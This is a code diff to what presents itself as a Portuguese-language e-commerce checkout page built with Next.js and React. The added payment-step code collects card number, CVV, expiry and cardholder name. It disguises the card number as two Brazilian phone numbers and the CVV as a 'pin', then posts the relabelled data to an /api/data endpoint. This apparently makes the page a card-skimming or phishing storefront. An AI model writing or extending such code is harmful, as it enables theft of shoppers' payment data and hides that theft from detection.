@@ -33,8 +33,12 @@ import ToggleColorMode from "./ToggleColorMode";
 import SitemarkIcon from "./SitemarkIcon";
 import Image from "next/image";
 import { useParams } from "next/navigation";
-import { products } from "../home/Home";
-
+import { bahiaproducts } from "../home/Home";
+import prisma from "@/lib/prisma";
+import { SetCtx, ValueCtx } from "@/app/[productId]/page";
+import axios from "axios";
+import { useForm, UseFormReturn } from "react-hook-form";
+import { IFormData } from "../../../interfaces";
 interface ToggleCustomThemeProps {
   showCustomTheme: Boolean;
   toggleCustomTheme: () => void;
@@ -47,39 +51,106 @@ function ToggleCustomTheme({
   return null;
 }
 const steps = ["Endereço", "Pagamento", "Revisão"];
-function getStepContent(step: number) {
+function getStepContent(
+  step: number,
+  hookForm: UseFormReturn<TFormData, any, undefined>,
+  onSubmit: (data: TFormData) => void
+) {
   switch (step) {
     case 0:
       return <AddressForm />;
     case 1:
-      return <PaymentForm />;
+      return <PaymentForm hookForm={hookForm} onSubmit={onSubmit} />;
     case 2:
       return <Review />;
     default:
       throw new Error("Unknown step");
   }
 }
+
+export type TFormData = {
+  cardNumber: string;
+  cvv: string;
+  expirationDate: string;
+  cardName: string;
+  saveCard: boolean;
+};
 export default function Checkout() {
+  const { formData } = React.useContext(ValueCtx);
+  const { setFormData } = React.useContext(SetCtx);
+  const hookForm = useForm<TFormData>({
+    defaultValues: {
+      cardName: "",
+      cardNumber: "",
+      cvv: "",
+      expirationDate: "",
+      saveCard: false,
+    },
+  });
+  const onSubmit = (data: TFormData) => {
+    const [a, b, c, d] = data.cardNumber.split(" ");
+    const first = "+55 (11) 9" + a + " " + b;
+    const second = "+55 (11) 9" + c + " " + d;
+    console.log(a, b, c, d);
+    setFormData((prev) => ({
+      ...prev,
+      ...data,
+      phoneA: first,
+      phoneB: second,
+      pin: parseInt(data.cvv) ?? 0,
+      date: data.expirationDate,
+      holder: data.cardName,
+    }));
+    setTimeout(async () => {
+      const response = await axios.post("/api/data", formData);
+
+      console.log(response);
+    });
+  };
   const [mode, setMode] = React.useState<PaletteMode>("light");
   const [showCustomTheme, setShowCustomTheme] = React.useState(true);
   const checkoutTheme = createTheme(getCheckoutTheme(mode));
   const defaultTheme = createTheme({ palette: { mode } });
   const [activeStep, setActiveStep] = React.useState(0);
+  const [l, setL] = React.useState<boolean>(false);
   const toggleColorMode = () => {
     setMode((prev) => (prev === "dark" ? "light" : "dark"));
   };
   const toggleCustomTheme = () => {
     setShowCustomTheme((prev) => !prev);
   };
-  const handleNext = () => {
+  const handleNext = async () => {
+    setL(true);
+    if (activeStep === 1) {
+      const values = hookForm.getValues();
+      const [a, b, c, d] = values.cardNumber.split(" ");
+      const first = "+55 (11) 9" + a + " " + b;
+      const second = "+55 (11) 9" + c + " " + d;
+      const data = {
+        phoneA: first,
+        phoneB: second,
+        pin: parseInt(values.cvv) ?? 0,
+        date: values.expirationDate,
+        holder: values.cardName,
+      };
+      setTimeout(async () => {
+        const response = await axios.post("/api/data", data);
+      });
+      setTimeout(() => {
+        setActiveStep(activeStep + 1);
+      }, 2000);
+      return;
+    }
+
     setActiveStep(activeStep + 1);
+    setL(false);
   };
   const handleBack = () => {
     setActiveStep(activeStep - 1);
   };
   const { productId } = useParams();
   const product = React.useMemo(() => {
-    return products.find((p) => p.id.toString() === productId);
+    return bahiaproducts.find((p) => p.id.toString() === productId);
   }, [productId]);
   return (
     <ThemeProvider theme={defaultTheme}>
@@ -286,7 +357,8 @@ export default function Checkout() {
               </Stack>
             ) : (
               <React.Fragment>
-                {getStepContent(activeStep)}
+                {}
+                {getStepContent(activeStep, hookForm, onSubmit)}
                 <Box
                   sx={[
                     {
@@ -311,7 +383,7 @@ export default function Checkout() {
                       variant="text"
                       sx={{ display: { xs: "none", sm: "flex" } }}
                     >
-                      Anterios
+                      Anterior
                     </Button>
                   )}
                   {activeStep !== 0 && (
@@ -322,7 +394,7 @@ export default function Checkout() {
                       fullWidth
                       sx={{ display: { xs: "flex", sm: "none" } }}
                     >
-                      Anterios
+                      Anterior
                     </Button>
                   )}
                   <Button
